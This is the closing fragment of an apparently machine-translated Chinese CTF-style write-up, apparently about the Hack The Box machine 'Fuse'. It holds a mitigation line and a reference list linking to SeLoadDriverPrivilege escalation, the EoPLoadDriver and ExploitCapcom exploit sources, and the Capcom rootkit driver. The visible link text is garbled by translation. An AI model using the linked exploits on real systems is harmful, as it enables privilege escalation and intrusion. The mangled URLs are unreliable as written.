lz ot md ou mh om on oo op bi translated">禁用或创建这些端口的安全策略</li></ul></div><div class="ab cl mo mp hx mq" role="separator"><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt mu"/><span class="mr bw bk ms mt"/></div><div class="im in io ip iq"><h1 id="6122" class="ku kv it bd kw kx na kz la lb nb ld le jz nc ka lg kc nd kd li kf ne kg lk ll bi translated">参考</h1><ol class=""><li id="26b2" class="oh oi it lo b lp lq ls lt lv pa lz pb md pc mh pd on oo op bi translated"><a class="ae mz" href="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" rel="noopener ugc nofollow" target="_blank">https://www . tarlogic . com/en/blog/abiling-seloaddriverprivilege-for-privilege-escalation/</a></li><li id="8d0f" class="oh oi it lo b lp oq ls or lv os lz ot md ou mh pd on oo op bi translated"><a class="ae mz" href="https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#active-directory-reconnaissance" rel="noopener ugc nofollow" target="_blank">https://bitvijays . github . io/LFF-IPS-P3-exploitation . html #活动目录-侦察</a></li><li id="f534" class="oh oi it lo b lp oq ls or lv os lz ot md ou mh pd on oo op bi translated"><a class="ae mz" href="https://www.samba.org/samba/docs/current/man-html/smbpasswd.8.html" rel="noopener ugc nofollow" target="_blank">https://www . samba . org/samba/docs/current/man-html/SMB passwd . 8 . html</a></li><li id="55fd" class="oh oi it lo b lp oq ls or lv os lz ot md ou mh pd on oo op bi translated"><a class="ae mz" href="https://www.calyptix.com/how-to/egress-filtering-101-what-it-is-and-how-to-do-it/" rel="noopener ugc nofollow" target="_blank">https://www . calyptix . com/how-to/egress-filtering-101-what-it-is-and-how-to-do-it/</a></li><li id="7ce8" class="oh oi it lo b lp oq ls or lv os lz ot md ou mh pd on oo op bi translated"><a class="ae mz" href="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" rel="noopener ugc nofollow" target="_blank">https://github . com/TarlogicSecurity/peoploaddriver/blob/master/peoploaddriver . CPP</a></li><li id="5646" class="oh oi it lo b lp oq ls or lv os lz ot md ou mh pd on oo op bi translated"><a class="ae mz" href="https://github.com/mach1el/htb-scripts/tree/master/exploit-fuse" rel="noopener ugc nofollow" target="_blank">https://github . com/mach 1el/htb-scripts/tree/master/exploit-fuse</a></li><li id="0741" class="oh oi it lo b lp oq ls or lv os lz ot md ou mh pd on oo op bi translated"><a class="ae mz" href="https://github.com/tandasat/ExploitCapcom/blob/master/ExploitCapcom/ExploitCapcom/ExploitCapcom.cpp" rel="noopener ugc nofollow" target="_blank">https://github . com/tanda sat/exploit capcom/blob/master/exploit capcom/exploit capcom/exploit capcom . CPP</a></li><li id="a66b" class="oh oi it lo b lp oq ls or lv os lz ot md ou mh pd on oo op bi translated"><a class="ae mz" href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" rel="noopener ugc nofollow" target="_blank">https://github . com/fuzzy security/Capcom-Rootkit/blob/master/Driver/Capcom . sys</a></li></ol></div></div>    
</body>
</html>